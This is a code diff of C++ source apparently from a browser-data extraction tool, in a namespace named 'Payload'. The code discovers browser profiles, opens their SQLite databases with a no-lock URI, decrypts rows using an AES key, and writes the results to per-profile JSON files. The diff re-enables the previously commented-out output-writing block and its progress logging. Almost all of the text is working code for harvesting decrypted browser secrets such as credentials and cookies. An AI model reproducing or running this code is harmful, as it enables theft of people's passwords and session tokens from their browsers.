@@ -545,7 +545,7 @@ namespace Payload
 
         std::vector<fs::path> FindProfiles()
         {
-            // m_logger.Log("[*] Discovering browser profiles in: " + m_userDataRoot.u8string());
+            m_logger.Log("[*] Discovering browser profiles in: " + m_userDataRoot.u8string());
             std::set<fs::path> uniqueProfilePaths;
 
             auto isProfileDirectory = [](const fs::path &path)
@@ -596,76 +596,77 @@ namespace Payload
             : m_profilePath(profilePath), m_config(config), m_aesKey(aesKey),
               m_logger(logger), m_baseOutputPath(baseOutputPath), m_browserName(browserName) {}
 
-    void Extract()
-    {
-        namespace fs = std::filesystem;
+        void Extract()
+        {
+            fs::path dbPath = m_profilePath / m_config.dbRelativePath;
+            if (!fs::exists(dbPath))
+                return;
 
-        // --- Step 1: Resolve DB path ---
-        const fs::path dbPath = m_profilePath / m_config.dbRelativePath;
-        if (!fs::exists(dbPath)) return;
+            sqlite3 *db = nullptr;
+            std::string uriPath = "file:" + dbPath.string() + "?nolock=1";
+            std::replace(uriPath.begin(), uriPath.end(), '\\', '/');
 
-        // --- Step 2: Open DB (read-only, URI mode) ---
-        sqlite3* rawDb = nullptr;
-        std::string uriPath = "file:" + dbPath.string() + "?nolock=1";
-        std::replace(uriPath.begin(), uriPath.end(), '\\', '/');
+            if (sqlite3_open_v2(uriPath.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK)
+            {
+                m_logger.Log("[-] Failed to open database " + dbPath.u8string() + ": " + (db ? sqlite3_errmsg(db) : "N/A"));
+                if (db)
+                    sqlite3_close_v2(db);
+                return;
+            }
+            auto dbCloser = [](sqlite3 *d)
+            { if (d) sqlite3_close_v2(d); };
+            std::unique_ptr<sqlite3, decltype(dbCloser)> dbGuard(db, dbCloser);
 
-        if (sqlite3_open_v2(uriPath.c_str(), &rawDb, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK) {
-            m_logger.Log("[-] dbase open failed " + dbPath.u8string() + ": " +
-                        (rawDb ? sqlite3_errmsg(rawDb) : "N/A"));
-            if (rawDb) sqlite3_close_v2(rawDb);
-            return;
+            sqlite3_stmt *stmt = nullptr;
+            if (sqlite3_prepare_v2(dbGuard.get(), m_config.sqlQuery.c_str(), -1, &stmt, nullptr) != SQLITE_OK)
+                return;
+            auto stmtFinalizer = [](sqlite3_stmt *s)
+            { if (s) sqlite3_finalize(s); };
+            std::unique_ptr<sqlite3_stmt, decltype(stmtFinalizer)> stmtGuard(stmt, stmtFinalizer);
+
+            std::any preQueryState;
+            if (m_config.preQuerySetup)
+            {
+                if (auto state = m_config.preQuerySetup(dbGuard.get()))
+                {
+                    preQueryState = *state;
+                }
+            }
+
+            std::vector<std::string> jsonEntries;
+            while (sqlite3_step(stmtGuard.get()) == SQLITE_ROW)
+            {
+                if (auto jsonEntry = m_config.jsonFormatter(stmtGuard.get(), m_aesKey, preQueryState))
+                {
+                    jsonEntries.push_back(*jsonEntry);
+                }
+            }
+
+            if (!jsonEntries.empty())
+            {
+                fs::path outFilePath = m_baseOutputPath / m_browserName / m_profilePath.filename() / (m_config.outputFileName + ".json");
+                std::error_code ec;
+                fs::create_directories(outFilePath.parent_path(), ec);
+                if (ec)
+                {
+                    m_logger.Log("[-] Failed to create directory: " + outFilePath.parent_path().u8string());
+                    return;
+                }
+
+                std::ofstream out(outFilePath, std::ios::trunc);
+                if (!out)
+                    return;
+
+                out << "[\n";
+                for (size_t i = 0; i < jsonEntries.size(); ++i)
+                {
+                    out << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
+                }
+                out << "\n]\n";
+
+                m_logger.Log("     [*] " + std::to_string(jsonEntries.size()) + " " + m_config.outputFileName + " extracted to " + outFilePath.u8string());
+            }
         }
-        std::unique_ptr<sqlite3, decltype(&sqlite3_close_v2)> db(rawDb, sqlite3_close_v2);
-
-        // --- Step 3: Prepare SQL statement ---
-        sqlite3_stmt* rawStmt = nullptr;
-        if (sqlite3_prepare_v2(db.get(), m_config.sqlQuery.c_str(), -1, &rawStmt, nullptr) != SQLITE_OK)
-            return;
-        std::unique_ptr<sqlite3_stmt, decltype(&sqlite3_finalize)> stmt(rawStmt, sqlite3_finalize);
-
-        // --- Step 4: Pre-query setup (optional) ---
-        std::any preQueryState;
-        if (m_config.preQuerySetup) {
-            if (auto state = m_config.preQuerySetup(db.get()))
-                preQueryState = *state;
-        }
-
-        // --- Step 5: Collect JSON rows ---
-        std::vector<std::string> jsonEntries;
-        while (sqlite3_step(stmt.get()) == SQLITE_ROW) {
-            if (auto json = m_config.jsonFormatter(stmt.get(), m_aesKey, preQueryState))
-                jsonEntries.push_back(*json);
-        }
-
-        
-
-        if (jsonEntries.empty()) return;
-
-        // --- Step 6: Write to output file ---
-        // const fs::path outFilePath =
-        //     m_baseOutputPath / m_browserName / m_profilePath.filename() /
-        //     (m_config.outputFileName + ".json");
-
-        // std::error_code ec;
-        // fs::create_directories(outFilePath.parent_path(), ec);
-        // if (ec) {
-        //     m_logger.Log("[-] Failed to create directory: " + outFilePath.parent_path().u8string());
-        //     return;
-        // }
-
-        // std::ofstream out(outFilePath, std::ios::trunc);
-        // if (!out) return;
-
-        // out << "[\n";
-        // for (size_t i = 0; i < jsonEntries.size(); ++i) {
-        //     out << jsonEntries[i];
-        //     if (i + 1 < jsonEntries.size()) out << ",\n";
-        // }
-        // out << "\n]\n";
-
-        // m_logger.Log("     [*] " + std::to_string(jsonEntries.size()) + " " +
-        //             m_config.outputFileName + " extracted to " + outFilePath.u8string());
-    }
 
     private:
         fs::path m_profilePath;
@@ -692,7 +693,7 @@ namespace Payload
         {
             BrowserManager browserManager;
             const auto &browserConfig = browserManager.getConfig();
-            // m_logger.Log("[*] Decryption process started for " + browserConfig.name);
+            m_logger.Log("[*] Decryption process started for " + browserConfig.name);
 
             std::vector<uint8_t> aesKey;
             {
@@ -707,7 +708,7 @@ namespace Payload
 
             for (const auto &profilePath : profilePaths)
             {
-                // m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
+                m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
                 for (const auto &dataConfig : Data::GetExtractionConfigs())
                 {
                     DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name);
@@ -715,7 +716,7 @@ namespace Payload
                 }
             }
 
-            // m_logger.Log("[*] All profiles processed. Decryption process finished.");
+            m_logger.Log("[*] All profiles processed. Decryption process finished.");
         }
 
     private:
